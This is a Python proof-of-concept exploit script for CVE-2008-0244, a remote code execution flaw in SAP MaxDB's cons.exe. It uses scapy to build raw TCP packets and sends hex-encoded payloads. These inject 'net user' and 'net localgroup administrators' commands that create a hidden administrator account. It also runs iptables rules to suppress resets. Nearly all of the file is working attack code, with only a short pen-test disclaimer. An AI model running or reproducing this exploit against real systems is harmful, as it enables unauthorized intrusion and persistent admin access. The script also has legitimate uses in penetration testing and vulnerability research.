import sys
import socket
import random
import getopt
from optparse import OptionParser
from scapy.all import *
import os
import signal
from time import sleep, ctime

def main():
    
    print " ^^ just ignore that :) "
    print
    print "***************************************************************************"
    print "* SAPMDBRET - SAP MaxDB Remote Exploit Tool - v1 gregkcarson@gmail.com    *"
    print "---------------------------------------------------------------------------"    
    print "  'I thought what I'd do was, I'd pretend I was one of those deaf-mutes.'  "
    print "---------------------------------------------------------------------------"
    print " Tool to use in attacking CVE 2008-0244 SAP MaxDB cons.exe RCE.            "  
    print " For legit pen test and research use only.  Although this program works, it"
    print " it is still just a PoC and thus some convenient features are missing.     "
    print " This vulnerability is old but I still see it in a fair number of projects."
    print " Thanks to Luigi Auriemma for the assistance."
    print

    usage = "usage: %prog [options] arg"
    parser = OptionParser(usage, version="Welcome to %prog, gregkcarson@gmail.com for questions v1.0")
    parser.add_option("-v","--verbose",action="store_true",dest="verbose", help="LOUD NOISES")
    parser.add_option("-q","--quiet", action="store_false",dest="verbose", help="shhhhhhh")
    parser.add_option("-i","--ip",type="string",dest="victim",help="Specify the victim IP")
    parser.add_option("-p","--port",type="int",dest="port",help="Specify the target port we will connect to.  If you are running ntpamp then it will override and default to 123.")
    options,args=parser.parse_args()    

    if options.victim is not None:
        global victim
        victim = options.victim
    else:
        print "Review usage. See help."      
        
    if options.port is not None:
        global port
        port = options.port
    else:
        print "See usage. Review Help"

    print "[*]-Port set to: "+str(port)
    print "[*]-Victim set to: "+victim 
    print "... Validating connection to target ..."
    print "Attempting to connect to target on %s:%s" % (victim, port)
    s = socket.socket()
    s.settimeout(2)
    try:
        s.connect((victim,port))
        print
        print "Connected successfully to %s on port %s" % (victim, port)
        print
        s.close()
    except socket.error, e:
        print
        print "Connection failed to %s on port %s failed. Reason: %s" % (victim,port,e)
        sys.exit(0)
    except KeyboardInterrupt:
        print
        print "User interrupted connection.  Quitting."
        sys.exit(0)    
    
    print "... Starting Attack Sequence ..."
    print
    
    #Scapy uses raw sockets which will confuse the Linux Kernel.
    os.system('iptables -A OUTPUT -p tcp -d ATTACKERIP -s VICTIMIP --dport 7210 --tcp-flags RST RST -j DROP')
    
    #Beginning of Attack Sequence
    #Change your source IP appropriately
    #Establish 3-WHS
    ipsection=IP(src="10.0.17.82",dst=victim)
    tcpsection=TCP(sport=random.randint(45000,65535),dport=port,flags="S", seq=12345)
    zeropacket=ipsection/tcpsection
    synack=sr1(zeropacket)
    gcack=synack.seq+1
    gcackport=synack.dport
    print "Following Source Port Was Assigned: "+str(gcackport)
    print
    ack=TCP(sport=gcackport,dport=port,flags="A",seq=12346,ack=gcack)
    send(ipsection/ack)
    
    print "Three Way Handshake Established!"
    print
    
    #Protocol Establish Communications
    PUSH=TCP(sport=gcackport,dport=port,flags="PA",seq=12346,ack=gcack)
    
    payload1 = (
    "\x57\x00\x00\x00\x03\x5b\x00\x00\x01\x00\x00\x00\xff\xff\xff\xff"
    "\x00\x00\x04\x00\x57\x00\x00\x00\x00\x02\x3f\x00\x04\x09\x00\x00"
    "\x00\x40\x00\x00\xd0\x3f\x00\x00\x00\x40\x00\x00\x70\x00\x00\x00"
    "\x00\xc5\x09\x00\xc8\xf6\x08\x00\x00\xe3\x0a\x00\xd4\x00\x00\x00"
    "\x07\x49\x31\x30\x31\x36\x00\x04\x50\x1c\x2a\x03\x52\x01\x09\x70"
    "\x64\x62\x6d\x73\x72\x76\x00")
    
    firstattack=ipsection/PUSH/Raw(load=payload1)
    firstreply=sr1(firstattack)
    gcack2=firstreply.ack
    ack2=TCP(sport=gcackport,dport=port,flags="A",window=64153,seq=gcack2,ack=firstreply.seq+87)
    send(ipsection/ack2)
    
    print "Server Version successfully probed - ACK reply sent - proceeding to commend execution"
    print
    
    #net user gregthg 1THGsecret! /ADD <-- If you want a different username and password change the hex accordingly, keep the byte length teh same.
    print "...Trying to create user..."
    PUSH2=TCP(sport=gcackport,dport=port,flags="PA",seq=gcack2,ack=firstreply.seq+87)                                                                             #\x2d\x68\x20
    
    payload2 = (
    "\x4a\x00\x00\x00\x03\x3f\x00\x00\x01\x00\x00\x00\x54\x0d\x00\x00"
    "\x00\x00\x04\x00\x4a\x00\x00\x00\x65\x78\x65\x63\x5f\x73\x64\x62"
    "\x69\x6e\x66\x6f\x20\x26\x26\x20\x6e\x65\x74\x20\x75\x73\x65\x72"
    "\x20\x67\x72\x65\x67\x74\x68\x67\x20\x31\x54\x48\x47\x73\x65\x63"
    "\x72\x65\x74\x21\x20\x2f\x41\x44\x44\x00")
    
    secondattack=ipsection/PUSH2/Raw(load=payload2)
    secondreply=sr1(secondattack)   
    
    #UNCOMMENT TO EXECUTE THE FOLLOWING COMMAND ON THE TARGET net localgroup administrators gregthg /ADD
    print "...Trying to join user to local administrators group..."
    print
    
    gcack3=secondreply.ack
    PUSH3=TCP(sport=gcackport,dport=port,flags="PA",seq=gcack3,ack=secondreply.seq+74)
    
    payload3 = (
    "\x53\x00\x00\x00\x03\x3f\x00\x00\x01\x00\x00\x00\x54\x0d\x00\x00"
    "\x00\x00\x04\x00\x53\x00\x00\x00\x65\x78\x65\x63\x5f\x73\x64\x62"
    "\x69\x6e\x66\x6f\x20\x26\x26\x20\x6e\x65\x74\x20\x6c\x6f\x63\x61"
    "\x6c\x67\x72\x6f\x75\x70\x20\x61\x64\x6d\x69\x6e\x69\x73\x74\x72"
    "\x61\x74\x6f\x72\x73\x20\x67\x72\x65\x67\x74\x68\x67\x20\x2f\x41"
    "\x44\x44\x00")
    
    thirdattack=ipsection/PUSH3/Raw(load=payload3)
    thirdreply=sr1(thirdattack)     
    
    #You should now be able to log in via RDP or connect over SMB to the target
    
    print "Attack Sequence Completed - Exiting Program!"
    
    os.system('iptables -D OUTPUT -p tcp -d ATTACKERIP -s VICTIMIP --dport 7210 --tcp-flags RST RST -j DROP')
    
    
if __name__=='__main__':
    main()
